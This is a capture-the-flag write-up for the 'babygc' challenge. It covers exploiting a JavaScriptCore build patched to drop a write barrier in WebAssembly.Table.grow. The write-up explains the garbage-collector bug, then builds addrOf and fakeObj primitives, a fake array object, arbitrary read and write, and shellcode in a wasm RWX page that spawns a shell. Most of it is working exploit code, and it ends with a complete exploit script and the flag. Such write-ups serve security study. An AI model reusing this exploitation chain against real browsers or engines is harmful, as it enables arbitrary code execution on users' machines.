# babygc

This was my introduction to Webkit exploitation.

I was not able to solve the challenge during the CTF.
While I was happy to have spotted the cause of the vulnerability that could lead to memory corruption, I was not able to trigger this on my own.
After the CTF, I talked to the author, zxc1337, who answered a lot of my questions about the challenge and provided his own solve script.

Looking back at the challenge a week later with a better understanding of the Webkit allocator and garbage collector, I was able to create a minimal PoC for reliably triggering the bug.
The reason I was originally unable to do so was because I had been triggering full collections, while the exploit requires an eden collection.

These blog posts helped a lot with understanding the Webkit heap:
- https://webkit.org/blog/7122/introducing-riptide-webkits-retreating-wavefront-concurrent-garbage-collector/
- https://webkit.org/blog/12967/understanding-gc-in-jsc-from-scratch/

## Challenge

The server is running JavaScriptCore from Webkit with a custom patch.

We are allowed to upload a JavaScript file to be run by the server.

The goal is to execute the `/readflag` binary.

### Patch

commit: 1fdbfd80de70e622ef15360b8cc069e72432c99e

```diff
diff --git a/Source/JavaScriptCore/jsc.cpp b/Source/JavaScriptCore/jsc.cpp
index 3e16dc074f2c..3c2f16caf0fd 100644
--- a/Source/JavaScriptCore/jsc.cpp
+++ b/Source/JavaScriptCore/jsc.cpp
@@ -294,6 +294,7 @@ static JSC_DECLARE_HOST_FUNCTION(functionPrintStdErr);
 static JSC_DECLARE_HOST_FUNCTION(functionPrettyPrint);
 static JSC_DECLARE_HOST_FUNCTION(functionDebug);
 static JSC_DECLARE_HOST_FUNCTION(functionDescribe);
+static JSC_DECLARE_HOST_FUNCTION(functionLeakStrid);
 static JSC_DECLARE_HOST_FUNCTION(functionDescribeArray);
 static JSC_DECLARE_HOST_FUNCTION(functionSleepSeconds);
 static JSC_DECLARE_HOST_FUNCTION(functionJSCStack);
@@ -540,6 +541,7 @@ private:
         Base::finishCreation(vm);
         JSC_TO_STRING_TAG_WITHOUT_TRANSITION();
 
+        addFunction(vm, "leakStrid"_s, functionLeakStrid, 1);
         addFunction(vm, "atob"_s, functionAtob, 1);
         addFunction(vm, "btoa"_s, functionBtoa, 1);
         addFunction(vm, "debug"_s, functionDebug, 1);
@@ -1451,6 +1453,16 @@ JSC_DEFINE_HOST_FUNCTION(functionDebug, (JSGlobalObject* globalObject, CallFrame
     return JSValue::encode(jsUndefined());
 }
 
+
+
+JSC_DEFINE_HOST_FUNCTION(functionLeakStrid, (JSGlobalObject* globalObject, CallFrame* callFrame))
+{
+    (void)globalObject;
+    if (callFrame->argumentCount() < 1)
+        return JSValue::encode(jsUndefined());
+    return JSValue::encode(jsNumber(callFrame->argument(0).asCell()->structureID().bits()));
+}
+
 JSC_DEFINE_HOST_FUNCTION(functionDescribe, (JSGlobalObject* globalObject, CallFrame* callFrame))
 {
     VM& vm = globalObject->vm();
diff --git a/Source/JavaScriptCore/wasm/WasmTable.cpp b/Source/JavaScriptCore/wasm/WasmTable.cpp
index 3361d2c655b7..d08962df4525 100644
--- a/Source/JavaScriptCore/wasm/WasmTable.cpp
+++ b/Source/JavaScriptCore/wasm/WasmTable.cpp
@@ -140,7 +140,7 @@ std::optional<uint32_t> Table::grow(uint32_t delta, JSValue defaultValue)
     switch (type()) {
     case TableElementType::Externref: {
         bool success = checkedGrow(static_cast<ExternRefTable*>(this)->m_jsValues, [&](auto& slot) {
-            slot.set(vm, m_owner, defaultValue);
+            slot.setStartingValue(defaultValue);
         });
         if (UNLIKELY(!success))
             return std::nullopt;
```

## Solution

### Finding the Vulnerability

The patch does 2 things:
- Adds a `leakStrid()` function to leak the structure ID of an object.
- Replaces `slot.set()` with `slot.setStartingValue` in the `WebAssembly.Table.prototype.grow()` method.

Notably, the `slot.setStartingValue()` method does not use a write barrier, while `slot.set()` does.

Heap collections in Webkit can either be eden collections or full collections.
Eden collections happen more frequently and will only collect new objects.
Objects that survive an eden collection will be marked as old and will only be collected during a full collection.

It is relatively uncommon for old objects to have pointers to new objects.
More often, new objects may point to new or old object, and old objects will point to other old objects.
For this reason, the eden collection is optimised by not checking old objects when marking objects for eden collection.
For times when an old object gets a pointer to a new object, we use a write barrier.

Since this patch removes the write barrier for `WebAssembly.Table.prototype.grow()`, changes made by this method will not be tracked properly during an eden collection.

### Proof-of-Concept

```js
var table = new WebAssembly.Table({
    element: "externref",
    initial: 0,
});

gc();

table.grow(1, new Array(0x100));                    

edenGC();

for (let i = 0; i < 4; i++) {
    new Uint8Array(new ArrayBuffer());
}

print(table.get(0).length);
```

Our table length should now be a much larger value than the original 0x100, as it has been overwriten by a pointer.

### addrOf and fakeObj primitives

I had to slightly modify the above PoC to add more corrupted arrays.
With only the one corrupted array, allocating a new array would claim the old object and replace the corrupted butterfly pointer.
Making around 8 of these seems to prevent this, probably due to how the free list works in JavaScriptCore.

We can then allocate many arrays which store a single `undefined` element to groom the heap, so that the next array with a single `undefined` element will at an address that is a little higher than the corrupted butterfly.

Using the corrupted butterfly, we can read the object pointer in this new array as a a float, thus creating our addrOf primitive.
We can also write a float into the new array to have an arbitrary address treated as a pointer to an object, this creating our fakeObj primitive.

```js
const table = new WebAssembly.Table({
    element: "externref",
    initial: 0,
});

gc();

for (let i = 0; i < 8; i++) {
    table.grow(1, new Array(0x100).fill(1.1));
}

edenGC();

for (let i = 0; i < 0x1000; i++) {
    new Uint8Array(new ArrayBuffer());
}

gc();

for (let i = 0; i < 0x100; i++) {
    [undefined];
}

const object_arr = [undefined];
const float_helper = new DataView(new ArrayBuffer(8));

function itof(x) {
    float_helper.setBigUint64(0, x, true);  
    return float_helper.getFloat64(0, true);
}

function ftoi(x) {
    float_helper.setFloat64(0, x, true);
    return float_helper.getBigUint64(0, true);
}

function addrOf(obj) {
    object_arr[0] = obj;
    return ftoi(table.get(0)[0x2888]);
}

function fakeObj(addr) {
    table.get(0)[0x2888] = itof(addr);
    return object_arr[0];
}

o = {a: 1.1};

print(o == fakeObj(addrOf(o)));
```

This should print "true" as `o` should be the same as `fakeObj(addrOf(o))`.

### Fake Object

We now have the ability to get the address of any object, and create a fake object from an arbitrary address.
We can also leak the structure ID of any object using the given `leakStrid()` built-in function.
This gives us everything we need to craft a fake object.

We start with a real object with 2 fields: `header` and `butterfly`.

The header contains metadata for the object, including flags and the structure ID.
We can set this to a CopyOnWriteArrayWithDouble using the leaked structure ID of a double array and finding the flags with a debugger.
Note that by writing the header as an object pointer, we avoid complications of JSValue tagging.

The butterfly is a pointer to our fake object's data.
By setting it to a real object, we can overwrite the butterfly of the object to read and write from arbitrary addresses.
Our victim object should have a non-inline property, as the shape of an object (including property offsets) is not dependent on the contents of the butterfly.
By contrast, the array length is dependent on a field in the butterfly.

As the properties of our fake object are inlined, they are stored in the object structure itself, not in the butterfly.
By shifting its address by 0x10 bytes, we get a new object with our fake properties.

```js
const victim = [];
victim.a = undefined;

const fake = fakeObj(addrOf({
    header: fakeObj((0x01082407n << 32n) + BigInt(leakStrid([1.1]))),
    butterfly: victim,
}) + 0x10n);

print(describe(victim));
print(describe(fake));
```

The butterfly of `fake` should be the address of `victim`.
The type of `fake` should be a CopyOnWriteArrayWithDouble.

### Arbitrary Read/Write

The property of our victim is 0x10 bytes lower than the butterfly pointer.
To read or write to an arbitrary address, we set the victim butterfly to 0x10 byte higher than the target address.
We can then read or write an object from `victim.a` and convert it to a BigInt using our `addrOf` primitive.

We can make our `arbRead` and `arbWrite` primitives read and write values as JavaScript objects, to avoid having to worry about converting tagged values.
Note that this does restrict our reads and writes to being within [0xa, 0xffefffffffffffff].

```js
function arbRead(addr) {
    fake[1] = itof(addr + 0x10n);
    return addrOf(victim.a);
}

function arbWrite(addr, val) {
    fake[1] = itof(addr + 0x10n);
    victim.a = fakeObj(val);
}

o = {a: 1.1};
arbWrite(addrOf(o), 0x4141414141414141n);
print('0x' + arbRead(addrOf(o)).toString(16));
```

This should print "0x4141414141414141", indicating that we have successfully overwritten memory in object `o`.

### RWX page

We can get a RWX page by creating a wasm instance.
Using our `addrOf` and `arbRead` primitives, we can find the address of a wasm function.

```js
const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);
const wasmModule = new WebAssembly.Module(wasmCode);
const wasmInstance = new WebAssembly.Instance(wasmModule);
const func = wasmInstance.exports.main;

const rwx = arbRead(arbRead(addrOf(func) + 0x30n));

print('0x' + rwx.toString(16));
```

We can check the memory mapping for the jsc process to verify that this address is marked as RWX.

### Shellcode

Using our `arbWrite` primitve, we can write shellcode 8 bytes at a time.
As we are writing values as object, not as floats, our 64-bit shellcode values are subject to the same restrictions as our `arbRead` and `arbWrite` primitives.

```js
const shellcode = [0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05];

for (let i = 0; i < shellcode.length + 7; i += 8) {
    let code64 = 0n;

    for (let j = 0; j < 8 && i + j < shellcode.length; j++) {
        code64 |= BigInt(shellcode[i + j]) << BigInt(8 * j);
    }

    arbWrite(rwx + BigInt(i), code64);
}

func();
```

This will overwrite the wasm function code with our shellcode.
When we call `func()`, we should be prompted with a shell.

## Exploit

```js
const table = new WebAssembly.Table({
    element: "externref",
    initial: 0,
});

gc();

for (let i = 0; i < 8; i++) {
    table.grow(1, new Array(0x100).fill(1.1));
}

edenGC();

for (let i = 0; i < 0x1000; i++) {
    new Uint8Array(new ArrayBuffer());
}

gc();

for (let i = 0; i < 0x100; i++) {
    [undefined];
}

const object_arr = [undefined];
const float_helper = new DataView(new ArrayBuffer(8));

function itof(x) {
    float_helper.setBigUint64(0, x, true);  
    return float_helper.getFloat64(0, true);
}

function ftoi(x) {
    float_helper.setFloat64(0, x, true);
    return float_helper.getBigUint64(0, true);
}

function addrOf(obj) {
    object_arr[0] = obj;
    return ftoi(table.get(0)[0x2888]);
}

function fakeObj(addr) {
    table.get(0)[0x2888] = itof(addr);
    return object_arr[0];
}

const victim = [];
victim.a = undefined;

const fake = fakeObj(addrOf({
    header: fakeObj((0x01082407n << 32n) + BigInt(leakStrid([1.1]))),
    butterfly: victim,
}) + 0x10n);

function arbRead(addr) {
    fake[1] = itof(addr + 0x10n);
    return addrOf(victim.a);
}

function arbWrite(addr, val) {
    fake[1] = itof(addr + 0x10n);
    victim.a = fakeObj(val);
}

const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);
const wasmModule = new WebAssembly.Module(wasmCode);
const wasmInstance = new WebAssembly.Instance(wasmModule);
const func = wasmInstance.exports.main;

const rwx = arbRead(arbRead(addrOf(func) + 0x30n));

const shellcode = [0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05];

for (let i = 0; i < shellcode.length + 7; i += 8) {
    let code64 = 0n;

    for (let j = 0; j < 8 && i + j < shellcode.length; j++) {
        code64 |= BigInt(shellcode[i + j]) << BigInt(8 * j);
    }

    arbWrite(rwx + BigInt(i), code64);
}

func();
```

## Flag

```
pbctf{d047ba60f8edcb1867e8b1392cac12d21ad21fec96bfb409}
```
